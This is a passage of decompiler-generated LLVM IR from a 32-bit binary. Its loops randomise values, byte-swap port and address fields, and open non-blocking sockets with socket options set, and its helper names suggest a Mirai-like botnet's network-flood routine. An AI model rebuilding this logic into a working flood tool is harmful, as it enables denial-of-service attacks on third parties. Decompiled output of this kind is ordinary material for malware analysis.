  %v2_8048b5d = add i32 %v0_8048b51, 4
  %v3_8048b5d = inttoptr i32 %v2_8048b5d to i32*
  store i32 %v3_8048b59, i32* %v3_8048b5d, align 4
  %v0_8048b5e = load i32, i32* @eax, align 4
  store i32 %v0_8048b5e, i32* %v1_8048b51, align 4
  %v3_8048b5f = call i32 @util_strcpy(i8* null, i32 %v5_80488dd)
  store i32 %v3_8048b5f, i32* %eax.global-to-local, align 4
  %v0_8048b64 = load i32, i32* @esp, align 4
  %v1_8048b64 = inttoptr i32 %v0_8048b64 to i32*
  %v2_8048b64 = load i32, i32* %v1_8048b64, align 4
  store i32 %v2_8048b64, i32* %eax.global-to-local, align 4
  %v3_8048b64 = add i32 %v0_8048b64, 4
  %v1_8048b65 = inttoptr i32 %v3_8048b64 to i32*
  %v2_8048b65 = load i32, i32* %v1_8048b65, align 4
  store i32 %v2_8048b65, i32* %edx.global-to-local, align 4
  %v1_8048b66 = add i32 %v0_8048b64, 96
  %v2_8048b66 = inttoptr i32 %v1_8048b66 to i32*
  %v3_8048b66 = load i32, i32* %v2_8048b66, align 4
  store i32 %v3_8048b66, i32* %v1_8048b65, align 4
  %v0_8048b6b = load i32, i32* @esi, align 4
  %v1_8048b6b = add i32 %v0_8048b6b, 789
  store i32 %v1_8048b6b, i32* @eax, align 4
  store i32 %v1_8048b6b, i32* %v1_8048b64, align 4
  %v3_8048b72 = call i32 @util_strcpy(i8* null, i32 %v5_80488dd)
  store i32 %v3_8048b72, i32* %eax.global-to-local, align 4
  %v0_8048b77 = load i32, i32* @esp, align 4
  %v6_8048b77 = icmp eq i32 %v0_8048b77, -16
  store i1 %v6_8048b77, i1* %zf.global-to-local, align 1
  %v0_8048b7a = load i32, i32* @edi, align 4
  %v1_8048b7a = add i32 %v0_8048b7a, 20
  %v2_8048b7a = inttoptr i32 %v1_8048b7a to i8*
  %v3_8048b7a = load i8, i8* %v2_8048b7a, align 1
  %v12_8048b7a = icmp eq i8 %v3_8048b7a, 31
  store i1 %v12_8048b7a, i1* %zf.global-to-local, align 1
  %tmp171 = icmp ult i8 %v3_8048b7a, 32
  br i1 %tmp171, label %dec_label_pc_8048b80, label %dec_label_pc_8048baa

dec_label_pc_8048b80:                             ; preds = %dec_label_pc_8048b3e
  %v1_8048b80 = add i32 %v0_8048b7a, 16
  %v2_8048b80 = inttoptr i32 %v1_8048b80 to i32*
  %v3_8048b80 = load i32, i32* %v2_8048b80, align 4
  store i32 %v3_8048b80, i32* %ebx.global-to-local, align 4
  %v1_8048b83 = call i32 @rand_next(i32 0)
  store i32 %v1_8048b83, i32* %eax.global-to-local, align 4
  %v1_8048b88 = trunc i32 %v3_8048b80 to i16
  %v2_8048b88 = call i16 @llvm.bswap.i16(i16 %v1_8048b88)
  %v3_8048b88 = zext i16 %v2_8048b88 to i32
  %v1_8048b8c = udiv i32 %v3_8048b80, 65536
  %v2_8048b8c = mul nuw i32 %v3_8048b88, 65536
  %v1_8048b8f = trunc i32 %v1_8048b8c to i16
  %v2_8048b8f = call i16 @llvm.bswap.i16(i16 %v1_8048b8f)
  %v3_8048b8f = zext i16 %v2_8048b8f to i32
  %v6_8048b8f = or i32 %v3_8048b8f, %v2_8048b8c
  store i32 %v6_8048b8f, i32* %ebx.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_8048b95 = load i32, i32* @edi, align 4
  %v1_8048b95 = add i32 %v0_8048b95, 20
  %v2_8048b95 = inttoptr i32 %v1_8048b95 to i8*
  %v3_8048b95 = load i8, i8* %v2_8048b95, align 1
  %v4_8048b95 = zext i8 %v3_8048b95 to i32
  store i32 %v4_8048b95, i32* %ecx.global-to-local, align 4
  %tmp177 = urem i8 %v3_8048b95, 32
  %v4_8048b98 = icmp eq i8 %tmp177, 0
  br i1 %v4_8048b98, label %bb119, label %bb

bb:                                               ; preds = %dec_label_pc_8048b80
  %v2_8048b98 = zext i8 %tmp177 to i32
  %v5_8048b98 = lshr i32 %v1_8048b83, %v2_8048b98
  %v6_8048b98 = icmp eq i32 %v5_8048b98, 0
  store i1 %v6_8048b98, i1* %zf.global-to-local, align 1
  store i32 %v5_8048b98, i32* %eax.global-to-local, align 4
  br label %bb119

bb119:                                            ; preds = %dec_label_pc_8048b80, %bb
  %v1_8048b9a = phi i32 [ %v1_8048b83, %dec_label_pc_8048b80 ], [ %v5_8048b98, %bb ]
  %v2_8048b9a = add i32 %v1_8048b9a, %v6_8048b8f
  %v12_8048b9a = icmp eq i32 %v2_8048b9a, 0
  store i1 %v12_8048b9a, i1* %zf.global-to-local, align 1
  %v1_8048b9c = trunc i32 %v2_8048b9a to i16
  %v2_8048b9c = call i16 @llvm.bswap.i16(i16 %v1_8048b9c)
  %v3_8048b9c = zext i16 %v2_8048b9c to i32
  %v1_8048ba0 = udiv i32 %v2_8048b9a, 65536
  %v2_8048ba0 = mul nuw i32 %v3_8048b9c, 65536
  %v1_8048ba3 = trunc i32 %v1_8048ba0 to i16
  %v2_8048ba3 = call i16 @llvm.bswap.i16(i16 %v1_8048ba3)
  %v3_8048ba3 = zext i16 %v2_8048ba3 to i32
  %v6_8048ba3 = or i32 %v3_8048ba3, %v2_8048ba0
  store i32 %v6_8048ba3, i32* %ebx.global-to-local, align 4
  %v1_8048ba7 = load i32, i32* @esi, align 4
  %v2_8048ba7 = add i32 %v1_8048ba7, 16
  %v3_8048ba7 = inttoptr i32 %v2_8048ba7 to i32*
  store i32 %v6_8048ba3, i32* %v3_8048ba7, align 4
  br label %dec_label_pc_8048baa

dec_label_pc_8048baa:                             ; preds = %dec_label_pc_8048b3e, %bb119
  %v1_8048baa = call i32 @rand_next(i32 0)
  %v2_8048baa = sext i32 %v1_8048baa to i64
  store i32 -858993459, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048baa, i32* @ebx, align 4
  %v5_8048bb6 = mul nuw nsw i64 %v2_8048baa, 3435973837
  %v6_8048bb6 = trunc i64 %v5_8048bb6 to i32
  %v7_8048bb6 = udiv i64 %v5_8048bb6, 4294967296
  %v8_8048bb6 = trunc i64 %v7_8048bb6 to i32
  store i32 %v6_8048bb6, i32* %eax.global-to-local, align 4
  store i32 %v8_8048bb6, i32* %edx.global-to-local, align 4
  %v1_8048bb8 = load i32, i32* @esp, align 4
  %v2_8048bb8 = add i32 %v1_8048bb8, 12
  %v3_8048bb8 = inttoptr i32 %v2_8048bb8 to i32*
  store i32 %v8_8048bb6, i32* %v3_8048bb8, align 4
  %v0_8048bbc = load i32, i32* %eax.global-to-local, align 4
  %v1_8048bbc = load i32, i32* @esp, align 4
  %v2_8048bbc = add i32 %v1_8048bbc, 8
  %v3_8048bbc = inttoptr i32 %v2_8048bbc to i32*
  store i32 %v0_8048bbc, i32* %v3_8048bbc, align 4
  %v0_8048bc0 = load i32, i32* @esp, align 4
  %v1_8048bc0 = add i32 %v0_8048bc0, 12
  %v2_8048bc0 = inttoptr i32 %v1_8048bc0 to i32*
  %v3_8048bc0 = load i32, i32* %v2_8048bc0, align 4
  %v0_8048bc4 = load i32, i32* @ebx, align 4
  %v2_8048bc6 = udiv i32 %v3_8048bc0, 4
  %v3_8048bc9 = mul i32 %v2_8048bc6, 5
  store i32 %v3_8048bc9, i32* %edx.global-to-local, align 4
  %v2_8048bcc = sub i32 %v0_8048bc4, %v3_8048bc9
  store i32 %v2_8048bcc, i32* %eax.global-to-local, align 4
  %v9_8048bce = icmp eq i32 %v2_8048bcc, 4
  store i1 %v9_8048bce, i1* %zf.global-to-local, align 1
  switch i32 %v2_8048bcc, label %dec_label_pc_804a55a [
    i32 0, label %dec_label_pc_804a629
    i32 1, label %dec_label_pc_804a65e
    i32 2, label %dec_label_pc_804a5f4
    i32 3, label %dec_label_pc_804a5bf
  ]

dec_label_pc_8048bde:                             ; preds = %dec_label_pc_80489fd
  %v2_8048bf1 = ptrtoint i32* %stack_var_-312 to i32
  store i32 %v2_8048bf1, i32* %edx.global-to-local, align 4
  %v1_8048bf8 = add i32 %v3_8048a9f, 16
  store i32 %v1_8048bf8, i32* %ecx.global-to-local, align 4
  %v1_8048bfb = add i32 %v3_8048a9f, 1452
  %v9_8048bfb = icmp eq i32 %v1_8048bfb, 0
  store i1 %v9_8048bfb, i1* %zf.global-to-local, align 1
  store i32 %v1_8048bfb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8048c0c

dec_label_pc_8048c0c:                             ; preds = %dec_label_pc_804a58b, %dec_label_pc_8048bde
  %v5_8048c0c = phi i32 [ %v2_8048bf1, %dec_label_pc_8048bde ], [ %v5_8048c0c.pre, %dec_label_pc_804a58b ]
  %v2_8048c15 = phi i32 [ %v15_80488b4, %dec_label_pc_8048bde ], [ %v0_8048c0c.pre, %dec_label_pc_804a58b ]
  %stack_var_-20888.0 = phi i32 [ %v1_8048bfb, %dec_label_pc_8048bde ], [ %tmp84, %dec_label_pc_804a58b ]
  %v1_8048c0c = add i32 %v2_8048c15, 90
  %v2_8048c0c = inttoptr i32 %v1_8048c0c to i16*
  %v3_8048c0c = load i16, i16* %v2_8048c0c, align 2
  %v2_8048c11 = call i16 @llvm.bswap.i16(i16 %v3_8048c0c)
  %v3_8048c11 = zext i16 %v2_8048c11 to i32
  %v5_8048c11 = and i32 %v5_8048c0c, -65536
  %v6_8048c11 = or i32 %v3_8048c11, %v5_8048c11
  store i32 %v6_8048c11, i32* %edx.global-to-local, align 4
  %v3_8048c15 = add i32 %v2_8048c15, 26
  %v4_8048c15 = inttoptr i32 %v3_8048c15 to i16*
  store i16 %v2_8048c11, i16* %v4_8048c15, align 2
  %v1_8048c1f = inttoptr i32 %stack_var_-20888.0 to i32*
  %v1_8048f9a = inttoptr i32 %stack_var_-20888.0 to i8*
  %v1_80490c3 = trunc i32 %stack_var_-20888.0 to i8
  %v2_80490ce = inttoptr i32 %v3_8048a9f to i32*
  %v3_80492f3 = sext i32 %stack_var_-20888.0 to i64
  %v0_8048c1a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048c1a

dec_label_pc_8048c1a:                             ; preds = %dec_label_pc_8048de6, %dec_label_pc_8048dda, %dec_label_pc_8048c1a, %dec_label_pc_8048e80, %dec_label_pc_8048c0c
  %v0_8048c1a = phi i32 [ %v0_8048c1a.pre, %dec_label_pc_8048c0c ], [ %v1_8048c41, %dec_label_pc_8048c1a ], [ %v0_8048de6, %dec_label_pc_8048dda ], [ %v1_8048e33, %dec_label_pc_8048de6 ], [ %v0_8048e93, %dec_label_pc_8048e80 ]
  %v9_8048c1a = icmp eq i32 %v0_8048c1a, 12
  store i1 %v9_8048c1a, i1* %zf.global-to-local, align 1
  %v1_8048c1d = add i32 %v0_8048c1a, -16
  %v2_8048c1d = inttoptr i32 %v1_8048c1d to i32*
  store i32 0, i32* %v2_8048c1d, align 4
  %v2_8048c1f = call i32 @__GI_time(i32* %v1_8048c1f)
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_8048c29 = load i32, i32* @esp, align 4
  %v2_8048c29 = add i32 %v1_8048c29, 64
  %v3_8048c29 = inttoptr i32 %v2_8048c29 to i32*
  store i32 %v2_8048c1f, i32* %v3_8048c29, align 4
  %v0_8048c2d = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8048c2d, i32* %ecx.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8048c31 = load i32, i32* @esp, align 4
  %v1_8048c31 = add i32 %v0_8048c31, 36
  %v2_8048c31 = inttoptr i32 %v1_8048c31 to i32*
  %v3_8048c31 = load i32, i32* %v2_8048c31, align 4
  %v4_8048c31 = inttoptr i32 %v3_8048c31 to i8*
  %v5_8048c36 = call i8* @_memset(i8* %v4_8048c31, i32 0, i32 %v0_8048c2d)
  %v0_8048c38 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8048c38, i32* %ecx.global-to-local, align 4
  %v0_8048c3a = load i32, i32* @esp, align 4
  %v1_8048c3a = add i32 %v0_8048c3a, 32
  %v2_8048c3a = inttoptr i32 %v1_8048c3a to i32*
  %v3_8048c3a = load i32, i32* %v2_8048c3a, align 4
  %v4_8048c3a = inttoptr i32 %v3_8048c3a to i8*
  store i1 false, i1* @df, align 1
  %v2_8048c3f = load i32, i32* %eax.global-to-local, align 4
  %v5_8048c3f = call i8* @_memset(i8* %v4_8048c3a, i32 %v2_8048c3f, i32 %v0_8048c38)
  %v6_8048c3f = ptrtoint i8* %v5_8048c3f to i32
  store i32 %v6_8048c3f, i32* @ecx, align 4
  %v0_8048c41 = load i32, i32* @esp, align 4
  %v1_8048c41 = add i32 %v0_8048c41, 16
  %v1_8048c44 = add i32 %v0_8048c41, 120
  %v2_8048c44 = inttoptr i32 %v1_8048c44 to i32*
  %v3_8048c44 = load i32, i32* %v2_8048c44, align 4
  store i32 %v3_8048c44, i32* %esi.global-to-local, align 4
  %v1_8048c48 = icmp eq i32 %v3_8048c44, 0
  store i1 %v1_8048c48, i1* %zf.global-to-local, align 1
  %tmp120 = icmp slt i32 %v3_8048c44, 1
  br i1 %tmp120, label %dec_label_pc_8048c1a, label %dec_label_pc_8048c4c

dec_label_pc_8048c4c:                             ; preds = %dec_label_pc_8048c1a
  %v1_8048c4c = add i32 %v0_8048c41, 48
  %v2_8048c4c = inttoptr i32 %v1_8048c4c to i32*
  %v3_8048c4c = load i32, i32* %v2_8048c4c, align 4
  store i32 %v3_8048c4c, i32* @esi, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @ebp, align 4
  %v1_8048c52 = add i32 %v0_8048c41, 108
  %v2_8048c52 = inttoptr i32 %v1_8048c52 to i32*
  store i32 0, i32* %v2_8048c52, align 4
  br label %dec_label_pc_8048cb3

dec_label_pc_8048c60:                             ; preds = %dec_label_pc_8048cc1
  %v10_8048c60 = icmp eq i8 %v3_8048cb3, 2
  store i1 %v10_8048c60, i1* %zf.global-to-local, align 1
  br i1 %v10_8048c60, label %dec_label_pc_80494e3, label %dec_label_pc_8048c68

dec_label_pc_8048c68:                             ; preds = %dec_label_pc_8048c60
  %v10_8048c68 = icmp eq i8 %v3_8048cb3, 4
  store i1 %v10_8048c68, i1* %zf.global-to-local, align 1
  br i1 %v10_8048c68, label %dec_label_pc_8048f42, label %dec_label_pc_8048c70

dec_label_pc_8048c70:                             ; preds = %dec_label_pc_8048c68
  %v10_8048c70 = icmp eq i8 %v3_8048cb3, 6
  store i1 %v10_8048c70, i1* %zf.global-to-local, align 1
  br i1 %v10_8048c70, label %dec_label_pc_8049548, label %dec_label_pc_8048c78

dec_label_pc_8048c78:                             ; preds = %dec_label_pc_8048c70
  %v10_8048c78 = icmp eq i8 %v3_8048cb3, 7
  store i1 %v10_8048c78, i1* %zf.global-to-local, align 1
  br i1 %v10_8048c78, label %dec_label_pc_8049773, label %dec_label_pc_8048c80

dec_label_pc_8048c80:                             ; preds = %dec_label_pc_8048c78
  %v10_8048c80 = icmp eq i8 %v3_8048cb3, 10
  store i1 %v10_8048c80, i1* %zf.global-to-local, align 1
  br i1 %v10_8048c80, label %dec_label_pc_8049798, label %dec_label_pc_8048c80.dec_label_pc_8048c88_crit_edge

dec_label_pc_8048c80.dec_label_pc_8048c88_crit_edge: ; preds = %dec_label_pc_8048c80
  %v0_8048c88.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048c88

dec_label_pc_8048c88:                             ; preds = %dec_label_pc_8048c80.dec_label_pc_8048c88_crit_edge, %dec_label_pc_80494e3
  %v0_8048c88 = phi i32 [ %v0_8048c88.pre, %dec_label_pc_8048c80.dec_label_pc_8048c88_crit_edge ], [ %v0_80494e3, %dec_label_pc_80494e3 ]
  %v9_8048c88 = icmp eq i32 %v0_8048c88, 12
  store i1 %v9_8048c88, i1* %zf.global-to-local, align 1
  %v2_8048c8b = inttoptr i32 %v1_8048cb6 to i32*
  %v3_8048c8b = load i32, i32* %v2_8048c8b, align 4
  store i32 %v3_8048c8b, i32* @eax, align 4
  store i8 0, i8* %v2_8048cb3, align 1
  %v0_8048c92 = load i32, i32* @eax, align 4
  %v1_8048c92 = load i32, i32* @esp, align 4
  %v2_8048c92 = add i32 %v1_8048c92, -4
  %v3_8048c92 = inttoptr i32 %v2_8048c92 to i32*
  store i32 %v0_8048c92, i32* %v3_8048c92, align 4
  %v1_8048c93 = call i32 @__GI___libc_close(i32 %stack_var_-20888.0)
  store i32 %v1_8048c93, i32* %eax.global-to-local, align 4
  %v0_8048c98 = load i32, i32* @esi, align 4
  %v1_8048c98 = add i32 %v0_8048c98, -16
  %v2_8048c98 = inttoptr i32 %v1_8048c98 to i32*
  store i32 -1, i32* %v2_8048c98, align 4
  %v0_8048c9f = load i32, i32* @esp, align 4
  %v1_8048c9f = add i32 %v0_8048c9f, 16
  %v6_8048c9f = icmp eq i32 %v1_8048c9f, 0
  store i1 %v6_8048c9f, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048ca2

dec_label_pc_8048ca2:                             ; preds = %dec_label_pc_8048d05.dec_label_pc_8048ca2_crit_edge, %dec_label_pc_8049798, %dec_label_pc_8049773, %dec_label_pc_8049548, %dec_label_pc_80494f5, %dec_label_pc_8049480, %dec_label_pc_8048d1c, %dec_label_pc_8048c88
  %v1_8048ca9 = phi i32 [ %v1_8048ca9.pre, %dec_label_pc_8048d05.dec_label_pc_8048ca2_crit_edge ], [ %v1_80497ae, %dec_label_pc_8049798 ], [ %v1_8049789, %dec_label_pc_8049773 ], [ %v1_804955e, %dec_label_pc_8049548 ], [ %v1_804950b, %dec_label_pc_80494f5 ], [ %v1_80494c5, %dec_label_pc_8049480 ], [ %v1_8048db4, %dec_label_pc_8048d1c ], [ %v1_8048c9f, %dec_label_pc_8048c88 ]
  %v0_8048ca2 = load i32, i32* @ebp, align 4
  %v1_8048ca2 = add i32 %v0_8048ca2, 1
  store i32 %v1_8048ca2, i32* @ebp, align 4
  %v0_8048ca3 = load i32, i32* @esi, align 4
  %v1_8048ca3 = add i32 %v0_8048ca3, 3140
  store i32 %v1_8048ca3, i32* @esi, align 4
  %v2_8048ca9 = add i32 %v1_8048ca9, 104
  %v3_8048ca9 = inttoptr i32 %v2_8048ca9 to i32*
  %v4_8048ca9 = load i32, i32* %v3_8048ca9, align 4
  %v15_8048ca9 = icmp eq i32 %v1_8048ca2, %v4_8048ca9
  store i1 %v15_8048ca9, i1* %zf.global-to-local, align 1
  br i1 %v15_8048ca9, label %dec_label_pc_8048dda, label %dec_label_pc_8048cb3

dec_label_pc_8048cb3:                             ; preds = %dec_label_pc_8048dc4, %dec_label_pc_8048ca2, %dec_label_pc_8048c4c
  %v0_8048cb3 = load i32, i32* @esi, align 4
  %v1_8048cb3 = add i32 %v0_8048cb3, -12
  %v2_8048cb3 = inttoptr i32 %v1_8048cb3 to i8*
  %v3_8048cb3 = load i8, i8* %v2_8048cb3, align 1
  %v4_8048cb3 = zext i8 %v3_8048cb3 to i32
  %v5_8048cb3 = load i32, i32* %eax.global-to-local, align 4
  %v6_8048cb3 = and i32 %v5_8048cb3, -256
  %v7_8048cb3 = or i32 %v6_8048cb3, %v4_8048cb3
  store i32 %v7_8048cb3, i32* %eax.global-to-local, align 4
  %v1_8048cb6 = add i32 %v0_8048cb3, -16
  store i32 %v1_8048cb6, i32* @edi, align 4
  %v6_8048cb9 = icmp eq i8 %v3_8048cb3, 0
  %v10_8048cb9 = icmp eq i8 %v3_8048cb3, 1
  store i1 %v10_8048cb9, i1* %zf.global-to-local, align 1
  br i1 %v10_8048cb9, label %dec_label_pc_8048f30, label %dec_label_pc_8048cc1

dec_label_pc_8048cc1:                             ; preds = %dec_label_pc_8048cb3
  store i1 %v6_8048cb9, i1* %zf.global-to-local, align 1
  %v1_8048cc3 = icmp eq i1 %v6_8048cb9, false
  br i1 %v1_8048cc3, label %dec_label_pc_8048c60, label %dec_label_pc_8048cc5

dec_label_pc_8048cc5:                             ; preds = %dec_label_pc_8048cc1, %dec_label_pc_80494da
  %v0_8048cc5 = load i32, i32* @esp, align 4
  %v1_8048cc5 = add i32 %v0_8048cc5, 20868
  %v2_8048cc5 = inttoptr i32 %v1_8048cc5 to i32*
  store i32 0, i32* %v2_8048cc5, align 4
  %v0_8048cd0 = load i32, i32* @esp, align 4
  %v1_8048cd0 = add i32 %v0_8048cd0, 20872
  %v2_8048cd0 = inttoptr i32 %v1_8048cd0 to i32*
  store i32 0, i32* %v2_8048cd0, align 4
  %v0_8048cdb = load i32, i32* @esp, align 4
  %v1_8048cdb = add i32 %v0_8048cdb, 20876
  %v2_8048cdb = inttoptr i32 %v1_8048cdb to i32*
  store i32 0, i32* %v2_8048cdb, align 4
  %v0_8048ce6 = load i32, i32* @esp, align 4
  %v1_8048ce6 = add i32 %v0_8048ce6, 20880
  %v2_8048ce6 = inttoptr i32 %v1_8048ce6 to i32*
  store i32 0, i32* %v2_8048ce6, align 4
  %v0_8048cf1 = load i32, i32* @esi, align 4
  %v1_8048cf1 = add i32 %v0_8048cf1, -16
  %v2_8048cf1 = inttoptr i32 %v1_8048cf1 to i32*
  %v3_8048cf1 = load i32, i32* %v2_8048cf1, align 4
  store i32 %v3_8048cf1, i32* @eax, align 4
  %v10_8048cf4 = icmp eq i32 %v3_8048cf1, -1
  store i1 %v10_8048cf4, i1* %zf.global-to-local, align 1
  %v1_8048d05.pre = load i32, i32* @esp, align 4
  br i1 %v10_8048cf4, label %dec_label_pc_8048d05, label %dec_label_pc_8048cf9

dec_label_pc_8048cf9:                             ; preds = %dec_label_pc_8048cc5
  %v9_8048cf9 = icmp eq i32 %v1_8048d05.pre, 12
  store i1 %v9_8048cf9, i1* %zf.global-to-local, align 1
  %v2_8048cfc = add i32 %v1_8048d05.pre, -16
  %v3_8048cfc = inttoptr i32 %v2_8048cfc to i32*
  store i32 %v3_8048cf1, i32* %v3_8048cfc, align 4
  %v1_8048cfd = call i32 @__GI___libc_close(i32 %stack_var_-20888.0)
  store i32 %v1_8048cfd, i32* %eax.global-to-local, align 4
  %v0_8048d02 = load i32, i32* @esp, align 4
  %v1_8048d02 = add i32 %v0_8048d02, 16
  %v6_8048d02 = icmp eq i32 %v1_8048d02, 0
  store i1 %v6_8048d02, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048d05

dec_label_pc_8048d05:                             ; preds = %dec_label_pc_8048cc5, %dec_label_pc_8048cf9
  %v1_8048d05 = phi i32 [ %v1_8048d02, %dec_label_pc_8048cf9 ], [ %v1_8048d05.pre, %dec_label_pc_8048cc5 ]
  %v0_8048d05 = load i32, i32* @ecx, align 4
  %v2_8048d05 = add i32 %v1_8048d05, -4
  %v3_8048d05 = inttoptr i32 %v2_8048d05 to i32*
  store i32 %v0_8048d05, i32* %v3_8048d05, align 4
  %v1_8048d06 = add i32 %v1_8048d05, -8
  %v2_8048d06 = inttoptr i32 %v1_8048d06 to i32*
  store i32 0, i32* %v2_8048d06, align 4
  %v1_8048d08 = add i32 %v1_8048d05, -12
  %v2_8048d08 = inttoptr i32 %v1_8048d08 to i32*
  store i32 1, i32* %v2_8048d08, align 4
  %v1_8048d0a = add i32 %v1_8048d05, -16
  %v2_8048d0a = inttoptr i32 %v1_8048d0a to i32*
  store i32 2, i32* %v2_8048d0a, align 4
  %v3_8048d0c = call i32 @socket(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048d0c, i32* %eax.global-to-local, align 4
  %v1_8048d14 = load i32, i32* @esi, align 4
  %v2_8048d14 = add i32 %v1_8048d14, -16
  %v3_8048d14 = inttoptr i32 %v2_8048d14 to i32*
  store i32 %v3_8048d0c, i32* %v3_8048d14, align 4
  %v0_8048d17 = load i32, i32* %eax.global-to-local, align 4
  %v10_8048d17 = icmp eq i32 %v0_8048d17, -1
  store i1 %v10_8048d17, i1* %zf.global-to-local, align 1
  br i1 %v10_8048d17, label %dec_label_pc_8048d05.dec_label_pc_8048ca2_crit_edge, label %dec_label_pc_8048d1c

dec_label_pc_8048d05.dec_label_pc_8048ca2_crit_edge: ; preds = %dec_label_pc_8048d05
  %v1_8048ca9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048ca2

dec_label_pc_8048d1c:                             ; preds = %dec_label_pc_8048d05
  %v0_8048d1c = load i32, i32* @edx, align 4
  %v1_8048d1c = load i32, i32* @esp, align 4
  %v2_8048d1c = add i32 %v1_8048d1c, -4
  %v3_8048d1c = inttoptr i32 %v2_8048d1c to i32*
  store i32 %v0_8048d1c, i32* %v3_8048d1c, align 4
  %v1_8048d1d = add i32 %v1_8048d1c, -8
  %v2_8048d1d = inttoptr i32 %v1_8048d1d to i32*
  store i32 0, i32* %v2_8048d1d, align 4
  %v1_8048d1f = add i32 %v1_8048d1c, -12
  %v2_8048d1f = inttoptr i32 %v1_8048d1f to i32*
  store i32 3, i32* %v2_8048d1f, align 4
  %v0_8048d21 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048d21 = add i32 %v1_8048d1c, -16
  %v3_8048d21 = inttoptr i32 %v2_8048d21 to i32*
  store i32 %v0_8048d21, i32* %v3_8048d21, align 4
  %v3_8048d22 = call i32 @__libc_fcntl(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  %v0_8048d27 = load i32, i32* @esp, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_8048d2a = or i32 %v3_8048d22, 2048
  store i32 %v12_8048d2a, i32* %eax.global-to-local, align 4
  %v2_8048d2d = add i32 %v0_8048d27, 8
  %v3_8048d2d = inttoptr i32 %v2_8048d2d to i32*
  store i32 %v12_8048d2a, i32* %v3_8048d2d, align 4
  %v1_8048d2e = add i32 %v0_8048d27, 4
  %v2_8048d2e = inttoptr i32 %v1_8048d2e to i32*
  store i32 4, i32* %v2_8048d2e, align 4
  %v0_8048d30 = load i32, i32* @esi, align 4
  %v1_8048d30 = add i32 %v0_8048d30, -16
  %v2_8048d30 = inttoptr i32 %v1_8048d30 to i32*
  %v3_8048d30 = load i32, i32* %v2_8048d30, align 4
  store i32 %v3_8048d30, i32* %eax.global-to-local, align 4
  %v3_8048d33 = inttoptr i32 %v0_8048d27 to i32*
  store i32 %v3_8048d30, i32* %v3_8048d33, align 4
  %v3_8048d34 = call i32 @__libc_fcntl(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  %v0_8048d39 = load i32, i32* @esp, align 4
  %v1_8048d39 = add i32 %v0_8048d39, 20916
  store i32 %v1_8048d39, i32* %eax.global-to-local, align 4
  %v2_8048d40 = inttoptr i32 %v1_8048d39 to i32*
  store i32 65535, i32* %v2_8048d40, align 4
  %v0_8048d4b = load i32, i32* @esp, align 4
  %v1_8048d4b = inttoptr i32 %v0_8048d4b to i32*
  store i32 4, i32* %v1_8048d4b, align 4
  %v0_8048d52 = load i32, i32* %eax.global-to-local, align 4
  %v1_8048d52 = load i32, i32* @esp, align 4
  %v2_8048d52 = add i32 %v1_8048d52, -4
  %v3_8048d52 = inttoptr i32 %v2_8048d52 to i32*
  store i32 %v0_8048d52, i32* %v3_8048d52, align 4
  %v1_8048d53 = add i32 %v1_8048d52, -8
  %v2_8048d53 = inttoptr i32 %v1_8048d53 to i32*
  store i32 8, i32* %v2_8048d53, align 4
  %v1_8048d55 = add i32 %v1_8048d52, -12
  %v2_8048d55 = inttoptr i32 %v1_8048d55 to i32*
  store i32 0, i32* %v2_8048d55, align 4
  %v0_8048d57 = load i32, i32* @esi, align 4
  %v1_8048d57 = add i32 %v0_8048d57, -16
  %v2_8048d57 = inttoptr i32 %v1_8048d57 to i32*
  %v3_8048d57 = load i32, i32* %v2_8048d57, align 4
  store i32 %v3_8048d57, i32* %eax.global-to-local, align 4
  %v2_8048d5a = add i32 %v1_8048d52, -16
  %v3_8048d5a = inttoptr i32 %v2_8048d5a to i32*
  store i32 %v3_8048d57, i32* %v3_8048d5a, align 4
  %v5_8048d5b = call i32 @__GI_setsockopt(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8048d5b, i32* %eax.global-to-local, align 4
  %v0_8048d60 = load i32, i32* @esi, align 4
  %v1_8048d60 = inttoptr i32 %v0_8048d60 to i32*
  %v2_8048d60 = load i32, i32* %v1_8048d60, align 4
  store i32 %v2_8048d60, i32* %eax.global-to-local, align 4
  %v0_8048d62 = load i32, i32* @esp, align 4
  %v1_8048d62 = add i32 %v0_8048d62, 58
  %v2_8048d62 = inttoptr i32 %v1_8048d62 to i16*
  %v3_8048d62 = load i16, i16* %v2_8048d62, align 2
  %v4_8048d62 = zext i16 %v3_8048d62 to i32
  %v5_8048d62 = load i32, i32* @edx, align 4
  %v6_8048d62 = and i32 %v5_8048d62, -65536
  %v7_8048d62 = or i32 %v6_8048d62, %v4_8048d62
  store i32 %v7_8048d62, i32* %edx.global-to-local, align 4
  %v2_8048d67 = add i32 %v0_8048d62, 20904
  %v3_8048d67 = inttoptr i32 %v2_8048d67 to i32*
  store i32 %v2_8048d60, i32* %v3_8048d67, align 4
  %v0_8048d6e = load i32, i32* @esp, align 4
  %v1_8048d6e = add i32 %v0_8048d6e, 80
  %v2_8048d6e = inttoptr i32 %v1_8048d6e to i32*
  %v3_8048d6e = load i32, i32* %v2_8048d6e, align 4
  store i32 %v3_8048d6e, i32* %ecx.global-to-local, align 4
  %v0_8048d72 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048d72 = trunc i32 %v0_8048d72 to i16
  %v3_8048d72 = add i32 %v0_8048d6e, 20902
